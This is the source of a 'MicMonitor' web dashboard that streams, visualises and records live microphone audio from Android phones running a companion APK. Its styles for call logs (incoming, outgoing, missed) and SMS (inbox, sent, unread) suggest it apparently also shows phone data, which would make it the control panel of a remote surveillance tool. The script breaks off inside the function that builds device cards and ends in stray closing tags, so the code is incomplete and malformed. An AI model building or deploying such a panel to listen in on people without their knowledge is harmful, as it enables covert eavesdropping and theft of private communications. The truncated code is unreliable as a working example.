<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MicMonitor Dashboard</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" crossorigin />
    <style>
      :root {
        --bg:      #080c14;
        --surface: #0e1420;
        --card:    #111827;
        --border:  #1e2d45;
        --border2: #243352;
        --accent:  #3b82f6;
        --accent2: #60a5fa;
        --green:   #22c55e;
        --red:     #ef4444;
        --amber:   #f59e0b;
        --cyan:    #06b6d4;
        --text:    #e2e8f0;
        --text2:   #94a3b8;
        --text3:   #475569;
        --mono:    "JetBrains Mono", monospace;
      }
      * { box-sizing: border-box; margin: 0; padding: 0; }
      body { font-family: "Inter","Segoe UI",sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; padding: 24px 20px; }
      ::-webkit-scrollbar { width: 5px; height: 5px; }
      ::-webkit-scrollbar-track { background: transparent; }
      ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 4px; }

      /* Header */
      .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; }
      .header-left { display: flex; align-items: center; gap: 14px; }
      .logo { width: 42px; height: 42px; background: linear-gradient(135deg,#1d4ed8,#7c3aed); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 22px; box-shadow: 0 0 20px rgba(59,130,246,.35); }
      .header-title { font-size: 20px; font-weight: 700; letter-spacing: -.3px; }
      .header-sub { font-size: 12px; color: var(--text3); margin-top: 2px; }

      /* Connection pill */
      .conn-pill { display: flex; align-items: center; gap: 8px; background: var(--surface); border: 1px solid var(--border); border-radius: 999px; padding: 7px 14px; font-size: 12px; font-weight: 500; color: var(--text2); transition: border-color .3s, color .3s; }
      .conn-pill.ok { border-color: rgba(34,197,94,.4); color: var(--green); }
      .conn-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--red); transition: background .3s; }
      .conn-dot.connected { background: var(--green); box-shadow: 0 0 8px rgba(34,197,94,.7); animation: pulse 2s infinite; }
      @keyframes pulse { 0%,100%{box-shadow:0 0 6px rgba(34,197,94,.6)} 50%{box-shadow:0 0 14px rgba(34,197,94,.9)} }

      /* Layout */
      .section-label { font-size: 11px; font-weight: 600; letter-spacing: .08em; text-transform: uppercase; color: var(--text3); margin-bottom: 10px; }
      .bottom-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 16px; }
      @media(max-width:700px){ .bottom-row{ grid-template-columns:1fr; } }

      /* Devices */
      #devicesContainer { display: flex; flex-direction: column; gap: 14px; }
      #noDevices { background: var(--surface); border: 1px dashed var(--border2); border-radius: 14px; padding: 48px 24px; text-align: center; color: var(--text3); font-size: 14px; line-height: 1.8; }
      #noDevices .nd-icon { font-size: 40px; display: block; margin-bottom: 12px; }

      /* Device card */
      .device-card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 20px; transition: border-color .3s; }
      .device-card:hover { border-color: var(--border2); }
      .device-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 4px; }
      .device-name { font-size: 15px; font-weight: 700; color: var(--accent2); display: flex; align-items: center; gap: 8px; }
      .device-name::before { content:''; display:inline-block; width:8px; height:8px; border-radius:50%; background:var(--green); box-shadow:0 0 8px rgba(34,197,94,.6); }
      .device-badge { font-size: 10px; font-weight: 700; letter-spacing: .06em; padding: 3px 10px; border-radius: 999px; background: rgba(34,197,94,.12); color: var(--green); border: 1px solid rgba(34,197,94,.25); transition: all .2s; }
      .device-badge.recording { background: rgba(239,68,68,.15); color: var(--red); border-color: rgba(239,68,68,.3); }
      .device-meta { font-size: 11px; color: var(--text3); font-family: var(--mono); margin-bottom: 14px; margin-top: 4px; }
      .health-grid { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 6px; margin: 0 0 12px; }
      @media(max-width:900px){ .health-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); } }
      .health-item { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 6px 8px; }
      .health-label { color: var(--text3); font-size: 9px; text-transform: uppercase; letter-spacing: .07em; }
      .health-val { color: var(--text); font-size: 11px; font-family: var(--mono); margin-top: 2px; }
      .br-badge { display: inline-block; min-width: 46px; text-align: center; border-radius: 999px; padding: 1px 8px; font-size: 10px; font-weight: 700; letter-spacing: .03em; border: 1px solid transparent; }
      .br-low { color: #fecaca; background: rgba(239,68,68,.16); border-color: rgba(239,68,68,.35); }
      .br-mid { color: #fde68a; background: rgba(245,158,11,.16); border-color: rgba(245,158,11,.35); }
      .br-high { color: #86efac; background: rgba(34,197,94,.16); border-color: rgba(34,197,94,.35); }
      .ok-text { color: var(--green); }
      .bad-text { color: var(--red); }

      /* Waveform */
      .canvas-wrap { background: #0a1628; border: 1px solid var(--border); border-radius: 10px; overflow: hidden; margin-bottom: 14px; position: relative; }
      .canvas-wrap canvas { width: 100%; height: 56px; display: block; }
      .canvas-label { position: absolute; top: 6px; left: 10px; font-size: 9px; font-weight: 600; letter-spacing: .08em; text-transform: uppercase; color: var(--text3); }

      /* Buttons */
      .btn-row { display: flex; gap: 7px; flex-wrap: wrap; margin-bottom: 14px; }
      button { font-family: "Inter",sans-serif; border: none; border-radius: 8px; cursor: pointer; padding: 8px 14px; font-size: 12px; font-weight: 600; transition: all .15s; display: flex; align-items: center; gap: 5px; white-space: nowrap; }
      button:hover:not(:disabled) { transform: translateY(-1px); filter: brightness(1.12); }
      button:active:not(:disabled) { transform: translateY(0); }
      button:disabled { opacity: .35; cursor: not-allowed; }
      .btn-live  { background: #1d4ed8; color: #fff; box-shadow: 0 2px 8px rgba(29,78,216,.4); }
      .btn-live.active { background: #7c3aed; box-shadow: 0 2px 8px rgba(124,58,237,.4); }
      .btn-rec   { background: #991b1b; color: #fff; box-shadow: 0 2px 8px rgba(153,27,27,.4); }
      .btn-stop  { background: #1e293b; color: var(--text2); border: 1px solid var(--border2); }
      .btn-ghost { background: #0f2040; color: var(--accent2); border: 1px solid rgba(59,130,246,.2); }
      .btn-rtc   { background: #065f46; color: #fff; box-shadow: 0 2px 8px rgba(6,95,70,.4); }
      .btn-rtc.active { background: #047857; box-shadow: 0 2px 8px rgba(4,120,87,.5); }

      /* Tabs */
      .tab-bar { display: flex; gap: 4px; flex-wrap: wrap; background: var(--surface); border-radius: 8px; padding: 4px; margin-bottom: 10px; }
      .tab-btn { flex: 1; background: transparent; border: none; border-radius: 6px; color: var(--text3); cursor: pointer; font-size: 11px; font-weight: 600; padding: 6px 8px; transition: all .15s; min-width: 60px; }
      .tab-btn:hover:not(.active) { color: var(--text2); background: rgba(255,255,255,.04); }
      .tab-btn.active { background: var(--accent); color: #fff; box-shadow: 0 1px 6px rgba(59,130,246,.4); }
      .tab-panel { display: none; max-height: 220px; overflow-y: auto; font-size: 12px; border-radius: 8px; background: var(--surface); padding: 4px; }
      .tab-panel.active { display: block; }
      .data-row { padding: 7px 10px; border-radius: 6px; border-bottom: 1px solid var(--border); line-height: 1.6; }
      .data-row:last-child { border-bottom: none; }
      .data-row:hover { background: rgba(255,255,255,.03); }
      .data-label { color: var(--text3); font-size: 10px; text-transform: uppercase; letter-spacing: .06em; }
      .data-val   { color: var(--text); word-break: break-all; }
      .data-badge { display: inline-block; border-radius: 4px; padding: 1px 7px; font-size: 9px; font-weight: 700; letter-spacing: .05em; text-transform: uppercase; margin-left: 6px; }
      .badge-in     { background:rgba(34,197,94,.15);  color:#86efac; border:1px solid rgba(34,197,94,.2); }
      .badge-out    { background:rgba(59,130,246,.15); color:#93c5fd; border:1px solid rgba(59,130,246,.2); }
      .badge-missed { background:rgba(239,68,68,.15);  color:#fca5a5; border:1px solid rgba(239,68,68,.2); }
      .badge-inbox  { background:rgba(6,182,212,.12);  color:#67e8f9; border:1px solid rgba(6,182,212,.2); }
      .badge-sent   { background:rgba(167,139,250,.12);color:#c4b5fd; border:1px solid rgba(167,139,250,.2); }
      .badge-unread { background:rgba(245,158,11,.15); color:#fcd34d; font-size:8px; margin-left:4px; border:1px solid rgba(245,158,11,.2); }

      /* Sidebar panels */
      .sidebar { display: flex; flex-direction: column; gap: 14px; }
      .panel { background: var(--card); border: 1px solid var(--border); border-radius: 16px; overflow: hidden; }
      .panel-head { display: flex; align-items: center; justify-content: space-between; padding: 14px 16px 0; }
      .panel-title { font-size: 12px; font-weight: 700; color: var(--text2); text-transform: uppercase; letter-spacing: .07em; display: flex; align-items: center; gap: 7px; }
      .panel-title .pi { font-size: 14px; }
      .panel-body { padding: 12px 16px 16px; }

      /* Recordings */
      #globalRecList { display: flex; flex-direction: column; gap: 6px; }
      .rec-item { display: flex; align-items: center; justify-content: space-between; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 8px 12px; transition: border-color .15s; }
      .rec-item:hover { border-color: var(--border2); }
      .rec-item a { color: var(--cyan); text-decoration: none; font-size: 11px; font-family: var(--mono); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 190px; }
      .rec-item a:hover { color: var(--accent2); text-decoration: underline; }
      .rec-size { color: var(--text3); font-size: 10px; font-family: var(--mono); flex-shrink: 0; margin-left: 8px; }
      .rec-empty { color: var(--text3); font-size: 12px; text-align: center; padding: 20px 0; }
      .rec-list { margin-bottom: 10px; display: flex; flex-direction: column; gap: 5px; }
      .rec-list .rec-item a { max-width: none; font-size: 11px; }

      /* Log */
      #logOutput { font-family: var(--mono); font-size: 11px; color: var(--text2); height: 200px; overflow-y: auto; line-height: 1.7; }
      .log-entry { padding: 1px 0; display: flex; gap: 8px; align-items: baseline; }
      .log-ts   { color: var(--text3); font-size: 10px; flex-shrink: 0; }
      .log-info { color: var(--accent2); }
      .log-warn { color: var(--amber); }
      .log-ok   { color: var(--green); }
      .log-err  { color: var(--red); }

      /* ── Light theme ──────────────────────────────────────────────── */
      body.light {
        --bg:      #f0f4f8;
        --surface: #e2e8f0;
        --card:    #ffffff;
        --border:  #cbd5e1;
        --border2: #94a3b8;
        --accent:  #2563eb;
        --accent2: #1d4ed8;
        --green:   #16a34a;
        --red:     #dc2626;
        --amber:   #d97706;
        --cyan:    #0891b2;
        --text:    #0f172a;
        --text2:   #334155;
        --text3:   #64748b;
      }
      body.light .canvas-wrap { background: #f8fafc; }
      body.light .tab-panel   { background: #f1f5f9; }
      body.light #logOutput   { color: var(--text2); }

      /* Theme toggle button */
      #themeToggle { background: var(--surface); border: 1px solid var(--border); border-radius: 999px; color: var(--text2); cursor: pointer; font-size: 13px; padding: 7px 14px; transition: all .2s; }
      #themeToggle:hover { border-color: var(--border2); color: var(--text); }

      /* ── VU Meter ─────────────────────────────────────────────────── */
      .vu-wrap { display: flex; align-items: center; gap: 6px; margin-bottom: 10px; }
      .vu-bar-bg { flex: 1; height: 8px; background: var(--surface); border: 1px solid var(--border); border-radius: 4px; overflow: hidden; }
      .vu-bar-fill { height: 100%; width: 0%; border-radius: 4px; transition: width .08s linear; background: linear-gradient(90deg, #22c55e 0%, #f59e0b 75%, #ef4444 95%); }
      .vu-db { font-family: var(--mono); font-size: 10px; color: var(--text3); min-width: 52px; text-align: right; }
      .clip-warn { display: none; font-size: 10px; font-weight: 700; color: var(--red); letter-spacing: .06em; animation: clipBlink .35s infinite alternate; }
      .clip-warn.active { display: inline; }
      @keyframes clipBlink { from { opacity:1; } to { opacity:0.2; } }

      /* ── Frequency bars ───────────────────────────────────────────── */
      .canvas-wrap.freq canvas { height: 72px; }

      /* ── Noise floor history chart ────────────────────────────────── */
      .noise-chart-wrap { margin-bottom: 10px; }
      .noise-chart-wrap canvas { width: 100%; height: 52px; display: block; background: #0a1628; border-radius: 8px; border: 1px solid var(--border); }
      body.light .noise-chart-wrap canvas { background: #f8fafc; }

      /* ── Connection quality indicator ─────────────────────────────── */
      .conn-quality-bar { display: flex; gap: 3px; align-items: flex-end; height: 18px; }
      .cq-seg { width: 6px; border-radius: 2px 2px 0 0; background: var(--border2); transition: background .3s, height .3s; }
      .cq-seg.lit { background: var(--green); }
      .cq-seg.warn { background: var(--amber); }
      .cq-seg.bad  { background: var(--red); }
    </style>
  </head>
  <body>
    <div class="header">
      <div class="header-left">
        <div class="logo">🎙</div>
        <div>
          <div class="header-title">MicMonitor</div>
          <div class="header-sub">Remote audio dashboard</div>
        </div>
      </div>
      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
        <button id="themeToggle" onclick="toggleTheme()">🌙 Dark</button>
        <div class="conn-pill" id="connPill">
          <div id="wsDot" class="conn-dot"></div>
          <span id="wsStatus">Connecting…</span>
        </div>
      </div>
    </div>

    <div class="section-label">Connected Devices</div>
    <div id="devicesContainer">
      <div id="noDevices">
        <span class="nd-icon">📵</span>
        No devices connected yet.<br />
        Install the APK and grant microphone permission.
      </div>
    </div>

    <div class="bottom-row">
      <div class="panel">
        <div class="panel-head">
          <div class="panel-title"><span class="pi">📂</span> Recordings</div>
        </div>
        <div class="panel-body">
          <div id="globalRecList"><div class="rec-empty">No recordings yet.</div></div>
        </div>
      </div>
      <div class="panel">
        <div class="panel-head">
          <div class="panel-title"><span class="pi">📋</span> Event Log</div>
        </div>
        <div class="panel-body" style="padding-top:8px">
          <div id="logOutput"></div>
        </div>
      </div>
    </div>

    <script>
      const _wsProto = location.protocol === "https:" ? "wss" : "ws";
      const _wsHost = location.port ? `${location.hostname}:${location.port}` : location.hostname;
      let webRtcConfig = {
        iceServers: [{ urls: ["stun:stun.l.google.com:19302"] }],
        tokenRequired: false,
      };

      // ── Dark / Light theme ───────────────────────────────────────────────
      (function initTheme() {
        const saved = localStorage.getItem("micmonitor:theme") || "dark";
        if (saved === "light") {
          document.body.classList.add("light");
          const btn = document.getElementById("themeToggle");
          if (btn) btn.textContent = "☀️ Light";
        }
      })();
      function toggleTheme() {
        const isLight = document.body.classList.toggle("light");
        const btn = document.getElementById("themeToggle");
        if (btn) btn.textContent = isLight ? "☀️ Light" : "🌙 Dark";
        try { localStorage.setItem("micmonitor:theme", isLight ? "light" : "dark"); } catch (_) {}
      }

      // ── Visualizer mode (wave / freq) per device ─────────────────────────
      function cycleVizMode(deviceId) {
        const state = deviceState[deviceId];
        if (!state) return;
        const modes = ["wave", "freq"];
        const current = state.vizMode || "wave";
        state.vizMode = modes[(modes.indexOf(current) + 1) % modes.length];
        const btn = document.getElementById(`btnVizMode_${deviceId}`);
        if (btn) btn.textContent = `Viz: ${state.vizMode.charAt(0).toUpperCase() + state.vizMode.slice(1)}`;
        const wrap = document.getElementById(`vizWrap_${deviceId}`);
        const label = document.getElementById(`vizLabel_${deviceId}`);
        if (wrap) wrap.classList.toggle("freq", state.vizMode === "freq");
        if (label) label.textContent = state.vizMode === "freq" ? "SPECTRUM" : "WAVEFORM";
      }

      // ── VU meter + Clipping detection ────────────────────────────────
      function updateVuMeter(deviceId, float32) {
        const fill = document.getElementById(`vuFill_${deviceId}`);
        const dbEl = document.getElementById(`vuDb_${deviceId}`);
        const clipEl = document.getElementById(`clipWarn_${deviceId}`);
        if (!fill || !dbEl) return;
        let peak = 0, sum = 0;
        for (let i = 0; i < float32.length; i++) {
          const a = Math.abs(float32[i]);
          if (a > peak) peak = a;
          sum += a * a;
        }
        const rms = Math.sqrt(sum / Math.max(1, float32.length));
        const dbRms = rms > 0 ? 20 * Math.log10(rms) : -96;
        const pct = Math.max(0, Math.min(100, ((dbRms + 60) / 60) * 100));
        fill.style.width = pct.toFixed(1) + "%";
        dbEl.textContent = dbRms > -96 ? dbRms.toFixed(1) + " dBFS" : "-∞ dBFS";
        const clipping = peak >= 0.98;
        if (clipEl) clipEl.classList.toggle("active", clipping);
        if (clipping) {
          const state = deviceState[deviceId];
          if (state) { state._lastClipAt = Date.now(); }
        }
      }

      // ── Noise Floor History Chart ────────────────────────────────────
      const NOISE_HISTORY_MAX = 120; // keep last 120 data points
      function pushNoiseHistory(deviceId, noiseDb) {
        const state = deviceState[deviceId];
        if (!state) return;
        if (!state.noiseHistory) state.noiseHistory = [];
        state.noiseHistory.push(noiseDb);
        if (state.noiseHistory.length > NOISE_HISTORY_MAX) state.noiseHistory.shift();
        drawNoiseChart(deviceId, state.noiseHistory);
      }
      function drawNoiseChart(deviceId, history) {
        const canvas = document.getElementById(`noiseChart_${deviceId}`);
        if (!canvas || !history || !history.length) return;
        const ctx = canvas.getContext("2d");
        const W = canvas.width, H = canvas.height;
        ctx.clearRect(0, 0, W, H);
        const isLight = document.body.classList.contains("light");
        ctx.fillStyle = isLight ? "#f8fafc" : "#0a1628";
        ctx.fillRect(0, 0, W, H);
        const MIN_DB = -80, MAX_DB = -30;
        const range = MAX_DB - MIN_DB;
        // Grid lines
        ctx.strokeStyle = isLight ? "rgba(0,0,0,0.08)" : "rgba(255,255,255,0.06)";
        ctx.lineWidth = 1;
        for (const db of [-70, -60, -50, -40]) {
          const y = H - ((db - MIN_DB) / range) * H;
          ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(W, y); ctx.stroke();
          ctx.fillStyle = isLight ? "#94a3b8" : "#475569";
          ctx.font = "9px monospace";
          ctx.fillText(`${db}dB`, 2, y - 2);
        }
        // Line
        const grad = ctx.createLinearGradient(0, 0, 0, H);
        grad.addColorStop(0, "#ef4444"); grad.addColorStop(0.5, "#f59e0b"); grad.addColorStop(1, "#22c55e");
        ctx.beginPath();
        ctx.strokeStyle = grad;
        ctx.lineWidth = 1.5;
        const step = W / Math.max(1, NOISE_HISTORY_MAX - 1);
        history.forEach((db, i) => {
          const x = i * step;
          const y = H - ((Math.max(MIN_DB, Math.min(MAX_DB, db)) - MIN_DB) / range) * H;
          i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
        });
        ctx.stroke();
      }

      // ── Connection Quality Bars ──────────────────────────────────────
      function updateConnectionQualityBar(deviceId, quality) {
        const bar = document.getElementById(`cqBar_${deviceId}`);
        if (!bar) return;
        const segs = bar.querySelectorAll(".cq-seg");
        // Score 0-4 based on RTT + loss + jitter
        const rtt = Number(quality?.rttMs);
        const loss = Number(quality?.lossPct);
        const jitter = Number(quality?.jitterMs);
        let score = 4;
        if (Number.isFinite(rtt)) {
          if (rtt > 300) score = Math.min(score, 1);
          else if (rtt > 150) score = Math.min(score, 2);
          else if (rtt > 80) score = Math.min(score, 3);
        }
        if (Number.isFinite(loss)) {
          if (loss > 10) score = Math.min(score, 1);
          else if (loss > 5) score = Math.min(score, 2);
          else if (loss > 1) score = Math.min(score, 3);
        }
        if (Number.isFinite(jitter)) {
          if (jitter > 80) score = Math.min(score, 1);
          else if (jitter > 40) score = Math.min(score, 2);
          else if (jitter > 20) score = Math.min(score, 3);
        }
        if (!Number.isFinite(rtt) && !Number.isFinite(loss) && !Number.isFinite(jitter)) score = 0;
        const cls = score <= 1 ? "bad" : score <= 2 ? "warn" : "lit";
        segs.forEach((seg, i) => {
          seg.className = "cq-seg" + (i < score ? " " + cls : "");
        });
      }

      let controlWs = null;
      const deviceState = {};
      let _wsReconnectDelay = 2000;   // exponential backoff start
      const RN_PROFILE_STORAGE_PREFIX = "micmonitor:rnprofile:";
      const RN_ENABLED_STORAGE_PREFIX = "micmonitor:rnenabled:";
      const RN_AUTO_STORAGE_PREFIX = "micmonitor:rnauto:";
      const GAIN_STORAGE_PREFIX = "micmonitor:gain:";
      let rnnoiseLibPromise = null;
      let rnnoiseWasmPromise = null;
      const rnnoiseWorkletLoadedContexts = new WeakSet();

      function getRnnoiseLib() {
        if (!rnnoiseLibPromise) {
          rnnoiseLibPromise = import("/vendor/web-noise-suppressor/index.js");
        }
        return rnnoiseLibPromise;
      }

      function getRnnoiseWasmBinary(lib) {
        if (!rnnoiseWasmPromise) {
          rnnoiseWasmPromise = lib.loadRnnoise({
            url: "/vendor/web-noise-suppressor/rnnoise.wasm",
            simdUrl: "/vendor/web-noise-suppressor/rnnoise_simd.wasm",
          });
        }
        return rnnoiseWasmPromise;
      }

      async function ensureRnnoiseNode(ctx, state, kind) {
        if (!state?.rnnoiseEnabled || !ctx?.audioWorklet || typeof AudioWorkletNode === "undefined") return null;
        const key = kind === "webrtc" ? "webRtcRnnoiseNode" : "pcmRnnoiseNode";
        const node = state[key];
        if (node) return node;

        const initKey = kind === "webrtc" ? "webRtcRnnoiseInitPromise" : "pcmRnnoiseInitPromise";
        if (state[initKey]) return state[initKey];

        state[initKey] = (async () => {
          try {
            const lib = await getRnnoiseLib();
            if (!rnnoiseWorkletLoadedContexts.has(ctx)) {
              await ctx.audioWorklet.addModule("/vendor/web-noise-suppressor/rnnoise/workletProcessor.js");
              rnnoiseWorkletLoadedContexts.add(ctx);
            }
            const wasmBinary = await getRnnoiseWasmBinary(lib);
            const rn = new lib.RnnoiseWorkletNode(ctx, { maxChannels: 1, wasmBinary });
            state[key] = rn;
            return rn;
          } catch (e) {
            state.rnnoiseEnabled = false;
            const btn = document.getElementById(`btnRn_${state.deviceId}`);
            if (btn) btn.textContent = "RNNoise: OFF";
            log(`RNNoise init failed: ${e.message}`, "warn");
            return null;
          } finally {
            state[initKey] = null;
          }
        })();

        return state[initKey];
      }

      function connectControlWs() {
        controlWs = new WebSocket(`${_wsProto}://${_wsHost}/control`);
        controlWs.binaryType = "arraybuffer";
        controlWs.onopen = () => {
          _wsReconnectDelay = 2000;  // reset backoff on successful connect
          setWsStatus(true);
          log("Connected to server", "ok");
        };
        controlWs.onclose = () => {
          setWsStatus(false);
          log(`Disconnected — reconnecting in ${(_wsReconnectDelay/1000).toFixed(0)}s…`, "warn");
          // Clear all device cards so they're rebuilt fresh on reconnect
          Object.keys(deviceState).forEach((id) => removeDeviceCard(id));
          const delay = _wsReconnectDelay;
          _wsReconnectDelay = Math.min(_wsReconnectDelay * 2, 30000); // cap at 30 s
          setTimeout(connectControlWs, delay);
        };
        controlWs.onerror = () => { log("WebSocket error", "err"); };
        controlWs.onmessage = (event) => {
          if (typeof event.data === "string") handleJsonMessage(JSON.parse(event.data));
          else handleAudioBinary(event.data);
        };
      }

      function handleJsonMessage(msg) {
        switch (msg.type) {
          case "device_list":        msg.devices.forEach((d) => addDeviceCard(d.deviceId, d.model, d.health || null)); break;
          case "device_connected":   addDeviceCard(msg.deviceId, msg.model || "…", msg.health || null); log(`Device connected: ${msg.deviceId}`, "ok"); break;
          case "device_disconnected": removeDeviceCard(msg.deviceId); log(`Device disconnected: ${msg.deviceId}`, "warn"); break;
          case "device_info":        updateDeviceMeta(msg.deviceId, msg.model, msg.sdk); log(`${msg.deviceId} → ${msg.model} (SDK ${msg.sdk})`, "info"); break;
          case "device_health":      renderDeviceHealth(msg.deviceId, msg.health || null); break;

          case "recording_started":  markRecording(msg.deviceId, true, msg.filename); log(`⏺ Recording started: ${msg.filename}`, "ok"); break;
          case "recording_stopped":  markRecording(msg.deviceId, false, msg.filename); log(`⏹ Recording saved: ${msg.filename}`, "ok"); refreshRecordingsList(); break;
          case "recording_saved":    log(`💾 Device saved: ${msg.filename}`, "info"); refreshRecordingsList(); break;
          case "ack":                log(`ACK ${msg.deviceId}: ${msg.message}`, "info"); break;
          case "device_data":        renderDeviceData(msg.deviceId, msg.data); break;
          case "webrtc_answer":      onWebRtcAnswer(msg.deviceId, msg.sdp); break;
          case "webrtc_ice":         onWebRtcIce(msg.deviceId, msg.candidate); break;
          case "webrtc_state":       renderWebRtcState(msg.deviceId, msg.state, msg.bitrateKbps, msg.quality || null); log(`WebRTC ${msg.deviceId}: ${msg.state || "state"}${msg.bitrateKbps ? ` (${msg.bitrateKbps} kbps)` : ""}`, "info"); break;
          case "error":              handleServerError(msg.message); break;
        }
      }

      function handleServerError(message) {
        log(`Error: ${message}`, "err");
        const m = /Device\s+([a-f0-9\-]+)\s+not found/i.exec(String(message || ""));
        if (!m) return;
        const missingId = m[1];
        const state = deviceState[missingId];
        if (!state) return;
        if (!state.useWebRtc || state.rtcConnected) return;
        if (state.webRtcRetryOnNotFoundDone) return;
        state.webRtcRetryOnNotFoundDone = true;
        log(`Refreshing device map and retrying WebRTC once for ${missingId}`, "warn");
        sendCmd(missingId, "get_data");
        sendCmd(missingId, "ping");
        setTimeout(async () => {
          if (!state.useWebRtc || state.rtcConnected || !state.rtcPeer) return;
          try {
            const offer = await state.rtcPeer.createOffer({ iceRestart: true });
            await state.rtcPeer.setLocalDescription(offer);
            sendCmd(missingId, "webrtc_start");
            sendCmd(missingId, "webrtc_offer", { sdp: offer.sdp });
            log(`WebRTC retry offer sent for ${missingId}`, "ok");
          } catch (e) {
            log(`WebRTC retry failed for ${missingId}: ${e.message}`, "err");
          }
        }, 800);
      }

      function handleAudioBinary(data) {
        // Binary frame format: [2-byte idLen][deviceId utf8][payload]
        const view = new DataView(data);
        const idLen = view.getUint16(0);
        const deviceId = new TextDecoder().decode(new Uint8Array(data, 2, idLen));
        const state = deviceState[deviceId];
        if (!state || !state.isLive) return;
        if (state.useWebRtc && state.rtcConnected) return;
        const payload = new Uint8Array(data, 2 + idLen);
        let float32 = new Float32Array(0);
        let playbackSampleRate = 16000;
        if (payload.length >= 4 && payload[0] === 0x4d && payload[1] === 0x4d && payload[2] === 0x01) {
          const codec = payload[3];
          if (codec === 0x01) {
            float32 = decodeMuLaw8k(payload.subarray(4));
            playbackSampleRate = 8000;
          } else {
            const pcm = payload.subarray(4);
            const int16 = new Int16Array(pcm.buffer, pcm.byteOffset, pcm.byteLength >> 1);
            float32 = new Float32Array(int16.length);
            for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;
            playbackSampleRate = 16000;
          }
        } else {
          const int16 = new Int16Array(payload.buffer, payload.byteOffset, payload.byteLength >> 1);
          float32 = new Float32Array(int16.length);
          for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;
        }
        if (state.health) {
          state.health.lastAudioChunkAt = Date.now();
          state.health.micCapturing = true;
          renderDeviceHealth(deviceId, state.health);
        }
        updateVuMeter(deviceId, float32);
        playAudioChunk(state, float32, playbackSampleRate);
        const mode = state.vizMode || "wave";
        if (mode === "freq") drawFreqBars(state.canvas, state.audioCtx, float32, playbackSampleRate);
        else drawWaveform(state.canvas, float32);
      }

      function decodeMuLaw8k(muLaw) {
        const out = new Float32Array(muLaw.length);
        for (let i = 0; i < muLaw.length; i++) {
          out[i] = muLawByteToFloat(muLaw[i]);
        }
        return out;
      }

      function muLawByteToFloat(value) {
        const mu = (~value) & 0xff;
        const sign = mu & 0x80;
        const exponent = (mu >> 4) & 0x07;
        const mantissa = mu & 0x0f;
        let sample = ((mantissa << 3) + 0x84) << exponent;
        sample -= 0x84;
        if (sign) sample = -sample;
        return sample / 32768;
      }

      function addDeviceCard(deviceId, model, health) {

          </div>

          </div>
